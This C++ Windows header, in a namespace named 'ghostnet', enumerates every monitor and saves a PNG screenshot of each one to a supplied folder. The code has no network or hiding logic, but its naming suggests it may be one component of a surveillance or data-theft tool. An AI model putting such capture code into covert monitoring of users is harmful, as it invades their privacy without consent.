#pragma once

#include <vector>
#include <string>
#define NOMINMAX
#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>

#pragma comment(lib, "gdiplus.lib")
namespace ghostnet {

struct MonitorInfo {
    HMONITOR hMonitor;
    RECT rect;
    int index;
};

inline std::vector<MonitorInfo> g_monitors;

inline BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdc, LPRECT lprcMonitor, LPARAM lParam) {
    MonitorInfo info;
    info.hMonitor = hMonitor;
    info.rect = *lprcMonitor;
    info.index = static_cast<int>(g_monitors.size() + 1);
    g_monitors.push_back(info);
    return TRUE;
}

inline int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    ::UINT num = 0;
    ::UINT size = 0;

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

    for (::UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

inline bool CaptureMonitor(const MonitorInfo& monitor, const std::string& outputPath) {
    int width = monitor.rect.right - monitor.rect.left;
    int height = monitor.rect.bottom - monitor.rect.top;

    HDC hScreenDC = CreateDC(L"DISPLAY", NULL, NULL, NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, monitor.rect.left, monitor.rect.top, SRCCOPY);
    SelectObject(hMemoryDC, hOldBitmap);

    Gdiplus::Bitmap* bitmap = new Gdiplus::Bitmap(hBitmap, NULL);

    CLSID pngClsid;
    GetEncoderClsid(L"image/png", &pngClsid);

    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    ULONG compressionLevel = 6;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderCompression;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Value = &compressionLevel;

    std::wstring wOutputPath(outputPath.begin(), outputPath.end());

    Gdiplus::Status status = bitmap->Save(wOutputPath.c_str(), &pngClsid, &encoderParams);

    delete bitmap;
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    DeleteDC(hScreenDC);

    return status == Gdiplus::Ok;
}

inline bool CaptureAllScreens(const std::string& ghostNetPath) {
    g_monitors.clear();
    EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
    if (g_monitors.empty()) {
        return false;
    }

    bool allSuccess = true;
    for (const auto& monitor : g_monitors) {
        std::string filename;
        if (g_monitors.size() == 1) {
            filename = ghostNetPath + "\\screen1.png";
        } else {
            filename = ghostNetPath + "\\screen" + std::to_string(monitor.index) + ".png";
        }
        if (!CaptureMonitor(monitor, filename)) {
            allSuccess = false;
        }
    }
    return allSuccess;
}

}


